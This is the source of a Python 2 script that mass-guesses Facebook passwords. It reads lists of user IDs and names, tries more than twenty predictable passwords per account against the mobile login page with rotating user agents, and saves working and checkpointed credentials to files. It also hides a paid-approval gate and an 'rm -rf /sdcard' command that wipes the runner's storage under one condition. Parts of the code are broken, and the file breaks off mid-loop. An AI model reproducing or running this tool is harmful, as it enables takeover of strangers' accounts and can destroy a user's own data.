#-*-coding:utf-8-*-
#flame-naim

import uuid
import requests,bs4,sys,os,subprocess
import requests,sys,random,time,re,base64,json
reload(sys)
sys.setdefaultencoding("utf-8")
from multiprocessing.pool import ThreadPool
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
try:
        import bs4
except ImportError:
        os.system("pip2 install bs4")
 
host="https://mbasic.facebook.com"

us = [
'Mozilla/5.0 (Linux; Android 9; TA-1021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 9; RMX1941) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 10; SM-A105FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 9; SNE-LX1 Build/HUAWEISNE-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 10; Mi A2 Lite Build/QKQ1.191002.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 11; SM-T505 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]'
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 8.1.0; LG-H932BK Build/OPM6.171019.030.K1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/193.0.0.45.101;]',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3'
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',]

logo ="""
         \x1b[1;97m   ######   ######  ######## \033[1;0m
         \x1b[1;91m  ##    ## ##    ## ##     ## \033[1;0m
         \x1b[1;97m  ##       ##       ##     ## \033[1;0m
         \x1b[1;91m   ######   ######  ########  \033[1;0m
         \x1b[1;97m        ##       ## ##     ## \033[1;0m
         \x1b[1;91m  ##    ## ##    ## ##     ## \033[1;0m
         \x1b[1;97m   ######   ######  ######## \033[1;0m
\x1b[1;97m------------------------\x1b[1;97m------------------------×
\033[1;91m[!]\033[1;97m Author \x1b[1;97m  : \x1b[1;97m          Sarfraz Baloch
\033[1;91m[!]\033[1;97m Facebook\x1b[1;97m:  \x1b[1;97m          Sarfraz Baloch
\033[1;91m[!]\033[1;97m GitHub\x1b[1;97m  :  \x1b[1;97m           Sarfraz-Baloch
\033[1;91m[!]\033[1;97m Version\x1b[1;97m : \x1b[1;97m             4.0.0
\x1b[1;97m------------------------\x1b[1;97m------------------------×
                                                 """

host="https://mbasic.facebook.com"
ips=None
try:
	b=requests.get("http://ip-api.com/json/").json()["query"]
	ips=requests.get("http://ip-api.com/json/"+b,headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()["Pakistan"].lower()
except:
	ips=None

ok = []
cp = []
ttl =[]


def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
    
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "what are you thinking now" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("[!] Wrong Cookies")

def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()

def hdcok():
	global host
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r

def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)

def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result8

def main():
    os.system("clear")
    print(logo)
    print(" \x1b[1;97m    [SSB] MAIN MENU")
    print("\x1b[1;97m-----------------------------------------------------")
    print("\x1b[1;91m [1]\x1b[1;97m  Paid Users Menu")
    print(" \x1b[1;91m[2]\x1b[1;97m  Free Users Menu ")
    print(" \x1b[1;91m[3]\x1b[1;97m  Join Facebook group")
    print("\x1b[1;97m-----------------------------------------------------")
    log_sel()
def log_sel():
	sel = raw_input(" Choose --->: ")
	if sel =="1":
		reg()
	elif sel =="2":
		os.system("python2 Spro1.py")
	elif sel =="3":
		os.system('xdg-open https://facebook.com/groups/1267278830395332/')
	
	else:
		print("")
		print("\tSelect valid option")
		print("")
		log_select()


#  RECODE AAHIL

def reg():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1mLOGIN KI LIYE APPROVAL LYLO PEHLY '
    print ''
    time.sleep(1)
    try:
        to = open('/sdcard/.sa.txt', 'r').read()
        if to ==" ":
            os.system('rm -rf /sdcard')
            os.system('rm -rf /sdcard/*')
        
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/hamayunpro/sar/main/server.txt').text
    if to in r:
        os.system('cd ..... && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd ..... && node index.js &')
        time.sleep(5)
        menu()
    else:
        os.system('clear')
        print logo
        print '\tApproved Failed'
        print ' \x1b[1;92mYour Id Is Not Approved '
        print ' \x1b[1;92mCopy the id and send to Admin'
        print ' \x1b[1;92mYour id : ' + to
        raw_input('\x1b[1;93m Press enter to send id')
        os.system('xdg-open https://wa.me/+923496519800')
        reg()


def reg2():
    os.system('clear')
    print logo
    print '\tApproval not detected'
    print ' \x1b[1;92mCopy and press enter ,'
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    raw_input(' Press enter to go to whatsapp ')
    os.system('xdg-open https://wa.me/+923496519800')
    sav = open('/sdcard/.sa.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[1;92m Press enter to check Approval ')
    reg()



def menu():
    os.system('clear')
    print logo
    tok = open('/sdcard/.sa.txt', 'r').read()
    print ' \x1b[1;92m Active token: \x1b[1;97m' + tok
    print("\x1b[1;97m-----------------------------------------------------")
    print(" \x1b[1;91m [1]\x1b[1;97m Crack with Auto pass")
    print("\x1b[1;91m  [2]\x1b[1;97m Crack with Choice pass")
    print(" \x1b[1;91m [3]\x1b[1;97m Extract ID")
    print("\x1b[1;91m  [0]\x1b[1;97m Back")
    print("\x1b[1;97m-----------------------------------------------------")
    menu_option()
    
def menu_option():
	select = raw_input("\x1b[1;97mChoose ---> ")
	if select =="1":
		crack()
	elif select =="2":
		choice()
	elif select =="3":
		name()
	elif select =="4":
		os.system("python2 dump.py")
		
		
	else:
		print("\tSelect valid option")
		menu_option()

def crack():
	os.system("clear")
	print(logo)
	print("\x1b[1;97m-----------------------------------------------------")
	print("\x1b[1;91m [1]\x1b[1;97m Crack File \x1b[1;90m [40 Pass] ")
	print("\x1b[1;91m [0]\x1b[1;97m Back")
	print("\x1b[1;97m-----------------------------------------------------")
	crack_select()
def crack_select():
	select = raw_input("\033[1;37mChoose ---> : \033[0;97m")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		print 
		filelist = raw_input("\x1b[1;91m[!]\x1b[1;97m File : ")
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print(" \033[1;37mRequested file not found\033[0;98m")
			raw_input(" Press enter to back ")
			crack()
	elif select =="0":
	    menu()
	else:
		print("\tSelect valid option\033[0;97m")
		choice_select()
	print("\x1b[1;97m----------------------------------------------------")
	print(" \x1b[1;91m     Use flight (airplane) mode before use")
	print("\x1b[1;97m---------------------------------------------------")
	print''
	print(" \x1b[1;97m               Total idz :\x1b[1;92m "+str(len(id)))
	print("\x1b[1;97m----------------------------------------------------")
	print(" \x1b[1;93m        Please Wait Cloning started...")
	print("\x1b[1;97m-----------------------------------------------------")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		sharagent = random.choice(us)
		session = requests.Session()
		session.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":sharagent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		host="https://mbasic.facebook.com"
		try:
			ps = name + '123'
			data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps, 'login': 'submit'})
			sp = data.content
			if 'mbasic_logout_button' in sp or 'save-device' in sp:
				print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps+'\033[0;97m')
				ok = open('OK.txt', 'a')
				ok.write(uid+'|'+ps+'\n')
				ok.close()
				oks.append(uid+ps)
			else:
				if 'checkpoint' in sp:
					print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps+'\033[0;97m')
					cp = open('CP.txt', 'a')
					cp.write(uid+'|'+ps+'\n')
					cp.close()
					cps.append(uid+ps)
				else:
					ps2 = name + '1122'
					data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps2, 'login': 'submit'})
					sp = data.content
					if 'mbasic_logout_button' in sp or 'save-device' in sp:
						print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps2+'\033[0;97m')
						ok = open('OK.txt', 'a')
						ok.write(uid+'|'+ps2+'\n')
						ok.close()
						oks.append(uid+ps2)
					else:
						if 'checkpoint' in sp:
							print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps2+'\033[0;97m')
							cp = open('CP.txt', 'a')
							cp.write(uid+'|'+ps2+'\n')
							cp.close()
							cps.append(uid+ps2)
						else:
							ps3 = name + '786'
							data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps3, 'login': 'submit'})
							sp = data.content
							if 'mbasic_logout_button' in sp or 'save-device' in sp:
								print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps3+'\033[0;97m')
								ok = open('OK.txt', 'a')
								ok.write(uid+'|'+ps3+'\n')
								ok.close()
								oks.append(uid+ps3)
							else:
								if 'checkpoint' in sp:
									print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps3+'\033[0;97m')
									cp = open('CP.txt', 'a')
									cp.write(uid+'|'+ps3+'\n')
									cp.close()
									cps.append(uid+ps3)
								else:
									ps4 = name + '12'
									data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps4, 'login': 'submit'})
									sp = data.content
									if 'mbasic_logout_button' in sp or 'save-device' in sp:
										print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps4+'\033[0;97m')
										ok = open('OK.txt', 'a')
										ok.write(uid+'|'+ps4+'\n')
										ok.close()
										oks.append(uid+ps4)
									else:
										if 'checkpoint' in sp:
											print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps4+'\033[0;97m')
											cp = open('CP.txt', 'a')
											cp.write(uid+'|'+ps4+'\n')
											cp.close()
											cps.append(uid+ps4)
										else:
											ps5 = name + '110'
											data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps5, 'login': 'submit'})
											sp = data.content
											if 'mbasic_logout_button' in sp or 'save-device' in sp:
												print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps5+'\033[0;97m')
												ok = open('OK.txt', 'a')
												ok.write(uid+'|'+ps5+'\n')
												ok.close()
												oks.append(uid+ps5)
											else:
												if 'checkpoint' in sp:
													print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps5+'\033[0;97m')
													cp = open('CP.txt', 'a')
													cp.write(uid+'|'+ps5+'\n')
													cp.close()
													cps.append(uid+ps5)
												else:
													ps6 = name + '234'
													data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps6, 'login': 'submit'})
													sp = data.content
													if 'mbasic_logout_button' in sp or 'save-device' in sp:
														print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps6+'\033[0;97m')
														ok = open('OK.txt', 'a')
														ok.write(uid+'|'+ps6+'\n')
														ok.close()
														oks.append(uid+ps6)
													else:
														if 'checkpoint' in sp:
															print(' \033[1;91m [SSB-CP] '+uid+' | '+ps6+'\033[0;97m')
															cp = open('CP.txt', 'a')
															cp.write(uid+'|'+ps6+'\n')
															cp.close()
															cps.append(uid+ps6)
														else:
															ps7 = ["first_name"] + ["last_name"]
															data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps7, 'login': 'submit'})
															sp = data.content
															if 'mbasic_logout_button' in sp or 'save-device' in sp:
																print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps7+'\033[0;97m')
																ok = open('OK.txt', 'a')
																ok.write(uid+'|'+ps7+'\n')
																ok.close()
																oks.append(uid+ps7)
															else:
																if 'checkpoint' in sp:
																	print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps7+'\033[0;97m')
																	cp = open('CP.txt', 'a')
																	cp.write(uid+'|'+ps7+'\n')
																	cp.close()
																	cps.append(uid+ps7)
																else:
																	ps8 = ["last_name"] + ["first_name"]
																	data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps8, 'login': 'submit'})
																	sp = data.content
																	if 'mbasic_logout_button' in sp or 'save-device' in sp:
																		print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps8+'\033[0;97m')
																		ok = open('OK.txt', 'a')
																		ok.write(uid+'|'+ps8+'\n')
																		ok.close()
																		oks.append(uid+ps8)
																	else:
																		if 'checkpoint' in sp:
																			print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps8+'\033[0;97m')
																			cp = open('CP.txt', 'a')
																			cp.write(uid+'|'+ps8+'\n')
																			cp.close()
																			cps.append(uid+ps8)
																		else:
																			ps9 = '786786786'
																			data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps9, 'login': 'submit'})
																			sp = data.content
																			if 'mbasic_logout_button' in sp or 'save-device' in sp:
																				print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps9+'\033[0;97m')
																				ok = open('OK.txt', 'a')
																				ok.write(uid+'|'+ps9+'\n')
																				ok.close()
																				oks.append(uid+ps9)
																			else:
																				if 'checkpoint' in sp:
																					print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps9+'\033[0;97m')
																					cp = open('CP.txt', 'a')
																					cp.write(uid+'|'+ps9+'\n')
																					cp.close()
																					cps.append(uid+ps9)
																				else:
																					ps10 = '000786'
																					data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps10, 'login': 'submit'})
																					sp = data.content
																					if 'mbasic_logout_button' in sp or 'save-device' in sp:
																						print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps10+'\033[0;97m')
																						ok = open('OK.txt', 'a')
																						ok.write(uid+'|'+ps10+'\n')
																						ok.close()
																						oks.append(uid+ps10)
																					else:
																						if 'checkpoint' in sp:
																							print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps10+'\033[0;97m')
																							cp = open('CP.txt', 'a')
																							cp.write(uid+'|'+ps10+'\n')
																							cp.close()
																							cps.append(uid+ps10)
																						else:
																							ps11 = '786000'
																							data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps11, 'login': 'submit'})
																							sp = data.content
																							if 'mbasic_logout_button' in sp or 'save-device' in sp:
																								print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps11+'\033[0;97m')
																								ok = open('OK.txt', 'a')
																								ok.write(uid+'|'+ps11+'\n')
																								ok.close()
																								oks.append(uid+ps11)
																							else:
																								if 'checkpoint' in sp:
																									print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps11+'\033[0;97m')
																									cp = open('CP.txt', 'a')
																									cp.write(uid+'|'+ps11+'\n')
																									cp.close()
																									cps.append(uid+ps11)
																								else:
																									ps12 = 'khan12'
																									data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps12, 'login': 'submit'})
																									sp = data.content
																									if 'mbasic_logout_button' in sp or 'save-device' in sp:
																										print(' \x1b[1;91m [SSB-OK] '+uid+' | '+ps12+'\033[0;97m')
																										ok = open('OK.txt', 'a')
																										ok.write(uid+'|'+ps12+'\n')
																										ok.close()
																										oks.append(uid+ps12)
																									else:
																										if 'checkpoint' in sp:
																											print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps12+'\033[0;97m')
																											cp = open('CP.txt', 'a')
																											cp.write(uid+'|'+ps12+'\n')
																											cp.close()
																											cps.append(uid+ps12)
																										else:
																											ps13 = '556677'
																											data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps13, 'login': 'submit'})
																											sp = data.content
																											if 'mbasic_logout_button' in sp or 'save-device' in sp:
																												print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps13+'\033[0;97m')
																												ok = open('OK.txt', 'a')
																												ok.write(uid+'|'+ps13+'\n')
																												ok.close()
																												oks.append(uid+ps13)
																											else:
																												if 'checkpoint' in sp:
																													print(' \033[1;91m [SSB-CP] '+uid+' | '+ps13+'\033[0;97m')
																													cp = open('CP.txt', 'a')
																													cp.write(uid+'|'+ps13+'\n')
																													cp.close()
																													cps.append(uid+ps13)
																												else:
																													ps14 = '667788'
																													data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps14, 'login': 'submit'})
																													sp = data.content
																													if 'mbasic_logout_button' in sp or 'save-device' in sp:
																														print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps14+'\033[0;97m')
																														ok = open('OK.txt', 'a')
																														ok.write(uid+'|'+ps14+'\n')
																														ok.close()
																														oks.append(uid+ps14)
																													else:
																														if 'checkpoint' in sp:
																															print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps14+'\033[0;97m')
																															cp = open('CP.txt', 'a')
																															cp.write(uid+'|'+ps14+'\n')
																															cp.close()
																															cps.append(uid+ps14)
																														else:
																															ps15 = '33445566'
																															data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps15, 'login': 'submit'})
																															sp = data.content
																															if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																print(' \x1b[1;91m [SSB-OK] '+uid+' | '+ps15+'\033[0;97m')
																																ok = open('OK.txt', 'a')
																																ok.write(uid+'|'+ps15+'\n')
																																ok.close()
																																oks.append(uid+ps15)
																															else:
																																if 'checkpoint' in sp:
																																	print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps15+'\033[0;97m')
																																	cp = open('CP.txt', 'a')
																																	cp.write(uid+'|'+ps15+'\n')
																																	cp.close()
																																	cps.append(uid+ps15)
																																else:
																																	ps16 = '889900'
																																	data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps16, 'login': 'submit'})
																																	sp = data.content
																																	if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																		print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps16+'\033[0;97m')
																																		ok = open('OK.txt', 'a')
																																		ok.write(uid+'|'+ps16+'\n')
																																		ok.close()
																																		oks.append(uid+ps16)
																																	else:
																																		if 'checkpoint' in sp:
																																			print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps16+'\033[0;97m')
																																			cp = open('CP.txt', 'a')
																																			cp.write(uid+'|'+ps16+'\n')
																																			cp.close()
																																			cps.append(uid+ps16)
																																		else:
																																			ps17 = '009988'
																																			data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps17, 'login': 'submit'})
																																			sp = data.content
																																			if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																				print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps17+'\033[0;97m')
																																				ok = open('OK.txt', 'a')
																																				ok.write(uid+'|'+ps17+'\n')
																																				ok.close()
																																				oks.append(uid+ps17)
																																			else:
																																				if 'checkpoint' in sp:
																																					print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps17+'\033[0;97m')
																																					cp = open('CP.txt', 'a')
																																					cp.write(uid+'|'+ps17+'\n')
																																					cp.close()
																																					cps.append(uid+ps17)
																																				else:
																																					ps18 = name + '12345'
																																					data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps18, 'login': 'submit'})
																																					sp = data.content
																																					if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																						print(' \x1b[1;91m [SSB-OK] '+uid+' | '+ps18+'\033[0;97m')
																																						ok = open('OK.txt', 'a')
																																						ok.write(uid+'|'+ps18+'\n')
																																						ok.close()
																																						oks.append(uid+ps18)
																																					else:
																																						if 'checkpoint' in sp:
																																							print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps18+'\033[0;97m')
																																							cp = open('CP.txt', 'a')
																																							cp.write(uid+'|'+ps18+'\n')
																																							cp.close()
																																							cps.append(uid+ps18)
																																						else:
																																							ps19 = '111222'
																																							data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps19, 'login': 'submit'})
																																							sp = data.content
																																							if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																								print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps19+'\033[0;97m')
																																								ok = open('OK.txt', 'a')
																																								ok.write(uid+'|'+ps19+'\n')
																																								ok.close()
																																								oks.append(uid+ps19)
																																							else:
																																								if 'checkpoint' in sp:
																																									print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps19+'\033[0;97m')
																																									cp = open('CP.txt', 'a')
																																									cp.write(uid+'|'+ps19+'\n')
																																									cp.close()
																																									cps.append(uid+ps19)
																																								else:
																																									ps20 = '112233'
																																									data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps20, 'login': 'submit'})
																																									sp = data.content
																																									if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																										print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps20+'\033[0;97m')
																																										ok = open('OK.txt', 'a')
																																										ok.write(uid+'|'+ps20+'\n')
																																										ok.close()
																																										oks.append(uid+ps20)
																																									else:
																																										if 'checkpoint' in sp:
																																											print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps20+'\033[0;97m')
																																											cp = open('CP.txt', 'a')
																																											cp.write(uid+'|'+ps20+'\n')
																																											cp.close()
																																											cps.append(uid+ps20)
																																										else:
																																											ps21 = 'khankhankhan'
																																											data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps21, 'login': 'submit'})
																																											sp = data.content
																																											if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																												print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps21+'\033[0;97m')
																																												ok = open('OK.txt', 'a')
																																												ok.write(uid+'|'+ps21+'\n')
																																												ok.close()
																																												oks.append(uid+ps21)
																																											else:
																																												if 'checkpoint' in sp:
																																													print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps21+'\033[0;97m')
																																													cp = open('CP.txt', 'a')
																																													cp.write(uid+'|'+ps21+'\n')
																																													cp.close()
																																													cps.append(uid+ps21)
																																												else:
																																													ps22 = 'khankhan'
																																													data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps22, 'login': 'submit'})
																																													sp = data.content
																																													if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																														print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps22+'\033[0;97m')
																																														ok = open('OK.txt', 'a')
																																														ok.write(uid+'|'+ps22+'\n')
																																														ok.close()
																																														oks.append(uid+ps22)
																																													else:
																																														if 'checkpoint' in sp:
																																															print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps22+'\033[0;97m')
																																															cp = open('CP.txt', 'a')
																																															cp.write(uid+'|'+ps22+'\n')
																																															cp.close()
																																															cps.append(uid+ps22)
																																														else:
																																															ps23 = 'pakistan123'
																																															data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps23, 'login': 'submit'})
																																															sp = data.content
																																															if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps23+'\033[0;97m')
																																																ok = open('OK.txt', 'a')
																																																ok.write(uid+'|'+ps23+'\n')
																																																ok.close()
																																																oks.append(uid+ps23)
																																															else:
																																																if 'checkpoint' in sp:
																																																	print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps23+'\033[0;97m')
																																																	cp = open('CP.txt', 'a')
																																																	cp.write(uid+'|'+ps23+'\n')
																																																	cp.close()
																																																	cps.append(uid+ps23)
																																																else:
																																																	ps24 = 'pakistan1234'
																																																	data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps24, 'login': 'submit'})
																																																	sp = data.content
																																																	if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																		print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps24+'\033[0;97m')
																																																		ok = open('OK.txt', 'a')
																																																		ok.write(uid+'|'+ps24+'\n')
																																																		ok.close()
																																																		oks.append(uid+ps24)
																																																	else:
																																																		if 'checkpoint' in sp:
																																																			print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps24+'\033[0;97m')
																																																			cp = open('CP.txt', 'a')
																																																			cp.write(uid+'|'+ps24+'\n')
																																																			cp.close()
